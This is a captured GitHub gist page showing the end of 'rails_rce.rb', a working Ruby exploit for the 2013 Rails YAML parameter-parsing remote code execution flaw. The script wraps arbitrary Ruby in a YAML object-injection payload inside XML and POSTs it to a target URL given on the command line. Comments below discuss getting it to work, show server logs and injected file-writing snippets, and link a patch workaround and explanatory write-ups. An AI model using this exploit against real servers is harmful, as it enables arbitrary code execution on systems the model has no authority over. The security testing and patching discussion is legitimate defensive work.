+          <pre><div class="line" id="file-rails_rce-rb-LC82">    <span class="k">raise</span><span class="p">(</span><span class="no">ArgumentError</span><span class="p">,</span><span class="s2">&quot;unsupported target: </span><span class="si">#{</span><span class="n">target</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC83">  <span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC84"><span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC85">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC86"><span class="k">def</span> <span class="nf">wrap_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC87">  <span class="s2">&quot;(</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">; @executed = true) unless @executed&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC88"><span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC89">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC90"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">target</span><span class="o">=</span><span class="ss">:rails3</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC91">  <span class="n">escaped_payload</span> <span class="o">=</span> <span class="n">escape_payload</span><span class="p">(</span><span class="n">wrap_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">target</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC92">  <span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">escaped_payload</span><span class="o">.</span><span class="n">to_yaml</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;--- &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">chomp</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC93">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC94">  <span class="n">yaml</span> <span class="o">=</span> <span class="sx">%{</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC95"><span class="sx">--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC96"><span class="sx">? </span><span class="si">#{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="sx"></span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC97"><span class="sx">: !ruby/struct</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC98"><span class="sx">  defaults:</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC99"><span class="sx">    :action: create</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC100"><span class="sx">    :controller: foos</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC101"><span class="sx">  required_parts: []</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC102"><span class="sx">  requirements:</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC103"><span class="sx">    :action: create</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC104"><span class="sx">    :controller: foos</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC105"><span class="sx">  segment_keys:</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC106"><span class="sx">    - :format</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC107"><span class="sx">  }</span><span class="o">.</span><span class="n">strip</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC108">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC109">  <span class="n">xml</span> <span class="o">=</span> <span class="sx">%{</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC110"><span class="sx">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC111"><span class="sx">&lt;exploit type=&quot;yaml&quot;&gt;</span><span class="si">#{</span><span class="n">yaml</span><span class="o">.</span><span class="n">html_escape</span><span class="si">}</span><span class="sx">&lt;/exploit&gt;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC112"><span class="sx">  }</span><span class="o">.</span><span class="n">strip</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC113">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC114">  <span class="k">return</span> <span class="n">http_post</span><span class="p">(</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC115">    <span class="ss">:url</span>       <span class="o">=&gt;</span> <span class="n">url</span><span class="p">,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC116">    <span class="ss">:headers</span>   <span class="o">=&gt;</span> <span class="p">{</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC117">      <span class="ss">:content_type</span>           <span class="o">=&gt;</span> <span class="s1">&#39;text/xml&#39;</span><span class="p">,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC118">      <span class="ss">:x_http_method_override</span> <span class="o">=&gt;</span> <span class="s1">&#39;get&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC119">    <span class="p">},</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC120">    <span class="ss">:body</span>      <span class="o">=&gt;</span> <span class="n">xml</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC121">  <span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC122"><span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC123">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC124"><span class="k">if</span> <span class="vg">$0</span> <span class="o">==</span> <span class="bp">__FILE__</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC125">  <span class="k">unless</span> <span class="no">ARGV</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;=</span> <span class="mi">2</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC126">    <span class="vg">$stderr</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;usage: </span><span class="si">#{</span><span class="vg">$0</span><span class="si">}</span><span class="s2"> URL RUBY [rails3|rails2]&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC127">    <span class="nb">exit</span> <span class="o">-</span><span class="mi">1</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC128">  <span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC129">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC130">  <span class="n">url</span>     <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC131">  <span class="n">payload</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC132">  <span class="n">target</span>  <span class="o">=</span> <span class="no">ARGV</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="ss">:rails3</span><span class="p">)</span><span class="o">.</span><span class="n">to_sym</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC133">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC134">  <span class="n">print_info</span> <span class="s2">&quot;POSTing </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2"> to </span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2"> ...&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC135">  <span class="n">response</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">target</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC136">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC137">  <span class="k">case</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC138">  <span class="k">when</span> <span class="s1">&#39;200&#39;</span> <span class="k">then</span> <span class="n">print_info</span> <span class="s2">&quot;Success!&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC139">  <span class="k">when</span> <span class="s1">&#39;500&#39;</span> <span class="k">then</span> <span class="n">print_error</span> <span class="s2">&quot;Error!&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC140">  <span class="k">else</span>            <span class="n">print_error</span> <span class="s2">&quot;Received response code </span><span class="si">#{</span><span class="n">response</span><span class="o">.</span><span class="n">code</span><span class="si">}</span><span class="s2">&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC141">  <span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC142"><span class="k">end</span></div></pre>
+        </td>
+      </tr>
+    </table>
+  </div>
+
+          </div>
+        </div>
+    <div id="comments" class="new-comments">
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/6962eeda5d20190857026da4621b9f9f?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714454">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/courtenay" class="comment-header-author">courtenay</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714454">
+              <a href="/4499206/#comment-714454">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714454">
+              <a href="/4499206/#comment-714454" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T05:05:21Z" datetime="2013-01-10T05:05:21Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>GETs are also vulnerable. (try it)</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/c4ceadae4f61dac8ff3ababc3faa6c42?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714494">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/fcoury" class="comment-header-author">fcoury</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714494">
+              <a href="/4499206/#comment-714494">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714494">
+              <a href="/4499206/#comment-714494" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T05:32:12Z" datetime="2013-01-10T05:32:12Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Do you know the changes needed for Rails 2 apps?</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/de3a1b8c8f8962230c5f165e01bf10e7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714631">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/lcx" class="comment-header-author">lcx</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714631">
+              <a href="/4499206/#comment-714631">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714631">
+              <a href="/4499206/#comment-714631" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T07:46:47Z" datetime="2013-01-10T07:46:47Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Update to 2.3.15 or use workaround: <a href="https://groups.google.com/forum/m/?fromgroups#!topic/rubyonrails-security/61bkgvnSGTQ">https://groups.google.com/forum/m/?fromgroups#!topic/rubyonrails-security/61bkgvnSGTQ</a></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/535d73db0b47b6f745e9981e80dabdb4?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714730">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/brynary" class="comment-header-author">brynary</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714730">
+              <a href="/4499206/#comment-714730">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714730">
+              <a href="/4499206/#comment-714730" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T08:23:50Z" datetime="2013-01-10T08:23:50Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>I wrote up a detailed explanation of the Rails vulnerability here: <a href="http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/">http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/</a></p>
+
+<p>It breaks down a proof of concept example step by step to illustrate how object injection leads to code injection.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/d47d347fda36eaa1670d68e15ef8dc1b?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-715006">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/bachue" class="comment-header-author">bachue</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-715006">
+              <a href="/4499206/#comment-715006">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-715006">
+              <a href="/4499206/#comment-715006" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T10:55:38Z" datetime="2013-01-10T10:55:38Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Can you explain to me what does "__END__" do in this gist? Thanks</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/22e6332a6e9dca26ac384c4e3ed0f31e?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-715122">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/200proof" class="comment-header-author">200proof</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-715122">
+              <a href="/4499206/#comment-715122">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-715122">
+              <a href="/4499206/#comment-715122" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T12:56:26Z" datetime="2013-01-10T12:56:26Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/bachue" class="user-mention">@bachue</a>: Ruby has a facility for inlining data into your code. Anything after <code>__END__</code> is ignored by the parser and is instead put into a special global called <code>DATA</code>. In this case, the named route generator does some wizardry using <code>module_eval</code>, and the <code>__END__</code> is used to make sure that only our code is run and any other wizardry skipped.</p>
+
+<p>More info on <code>DATA</code> and <code>__END__</code>: <a href="http://shifteleven.com/articles/2009/02/09/useless-ruby-tricks-data-and-__end__">http://shifteleven.com/articles/2009/02/09/useless-ruby-tricks-data-and-__end__</a></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-715366">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-715366">
+              <a href="/4499206/#comment-715366">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-715366">
+              <a href="/4499206/#comment-715366" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T15:46:37Z" datetime="2013-01-10T15:46:37Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Can someone explain what has to happen on the server-side to make this exploit work? I have tried executing it against a production 3.2.9 app and with the "puts 'lol'" code to execute and nothing shows up on my logs. My goal is to see the exploit work, update the app to mitigate the problem, then run again to verify it is no longer exploitable.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/0a81e3606ad8945bea745b48a3e66882?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716232">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/mjbellantoni" class="comment-header-author">mjbellantoni</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716232">
+              <a href="/4499206/#comment-716232">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716232">
+              <a href="/4499206/#comment-716232" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T18:10:55Z" datetime="2013-01-10T18:10:55Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>I had to modify this code slightly.  I removed the <code>x_http_method_override</code>.  Also, I did not see the Ruby code execute in either instance.  Here's what I saw in my server logs.</p>
+
+<p><strong>Unpatched Server</strong></p>
+
+<pre><code>Started POST "/items" for 127.0.0.1 at 2013-01-10 12:55:34 -0500
+  Processing by ItemsController#create as */*
+  Parameters: {"exploit"=&gt;#&lt;ActionDispatch::Routing::RouteSet::NamedRouteCollection:0x007ffa1225a148&gt;}
+</code></pre>
+
+<p><strong>Patched Server</strong></p>
+
+<pre><code>Started POST "/items" for 127.0.0.1 at 2013-01-10 12:56:14 -0500
+  Processing by ItemsController#create as */*
+  Parameters: {}
+</code></pre>
+
+<p>My changes are here: <a href="https://gist.github.com/4504388">https://gist.github.com/4504388</a></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/0d8bf3bd27189d1bba8365d532204dbb?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716252">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/cairo140" class="comment-header-author">cairo140</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716252">
+              <a href="/4499206/#comment-716252">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716252">
+              <a href="/4499206/#comment-716252" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T18:24:05Z" datetime="2013-01-10T18:24:05Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> you may be running your server in a way that doesn't capture stdout. Inject something like <code>File.open('/tmp/foo') {|f| f.write('bar')}</code>.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716747">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716747">
+              <a href="/4499206/#comment-716747">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716747">
+              <a href="/4499206/#comment-716747" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T22:57:10Z" datetime="2013-01-10T22:57:10Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Still no luck. I tried using the Rails logger to write to the log file. I also tried just creating a new file like <a href="/cairo140" class="user-mention">@cairo140</a> suggested. Here is what I see in my log:</p>
+
+<pre><code>Started GET "/home" for 76.20.208.70 at 2013-01-10 16:54:11 -0600
+Processing by PagesController#show as */*
+  Parameters: {"exploit"=&gt;{"foo; open('/tmp/exploit.txt') {|f| f.write('success')}\n__END__\n"=&gt;#&lt;OpenStruct defaults={:action=&gt;"create", :controller=&gt;"foos"}, required_parts=[], requirements={:action=&gt;"create", :controller=&gt;"foos"}, segment_keys=[:format]&gt;}, "id"=&gt;12}
+[....snip logs not relevant....]
+Completed 200 OK in 53ms (Views: 41.3ms | ActiveRecord: 2.2ms)
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/235c58ad566abb4c7979bc7033e9882c?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716751">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/dgm" class="comment-header-author">dgm</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716751">
+              <a href="/4499206/#comment-716751">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716751">
+              <a href="/4499206/#comment-716751" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T23:03:33Z" datetime="2013-01-10T23:03:33Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>The example in this gist does not match the current edit.... and I cannot get a successful test.   I would think another bit of code to run would be 'Rails.logger.debug "OUCH"'</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716827">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716827">
+              <a href="/4499206/#comment-716827">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716827">
+              <a href="/4499206/#comment-716827" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T00:42:48Z" datetime="2013-01-11T00:42:48Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/mjbellantoni" class="user-mention">@mjbellantoni</a> turns out <a href="https://github.com/ronin-ruby/ronin-support">ronin-support</a> <a href="https://github.com/ronin-ruby/ronin-support/blob/master/lib/ronin/network/http/http.rb#L288-L332">HTTP.request</a> will not send a body if <code>Net::HTTPRequest#request_body_permitted?</code> returns false; this has been fixed in <a href="https://github.com/ronin-ruby/ronin-support/commit/c2c27b820abffb5de6529bc7b0b8a641baacb372">master</a>. So a <code>POST</code> and <code>X-Http-Method-Override</code> are required. Your first example output looks correct. The output of the injected code should appear just above the Rails Request logging output.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716831">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716831">
+              <a href="/4499206/#comment-716831">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716831">
+              <a href="/4499206/#comment-716831" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T00:46:54Z" datetime="2013-01-11T00:46:54Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> Checkout the lengthy <a href="http://ronin-ruby.github.com/blog/2013/01/09/rails-pocs.html">write up</a>. I tested the exploit against a Rails 3.2.9 app, but in development mode. Perhaps check the production log files? However, your example output looks incorrect, it should contain an <code>ActionDispatch::Routing::RouteSet::NamedRouteCollection</code> object. Is this app running on Ruby 1.8?</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716993">
+        <div class="comment-header normal-comment-header">
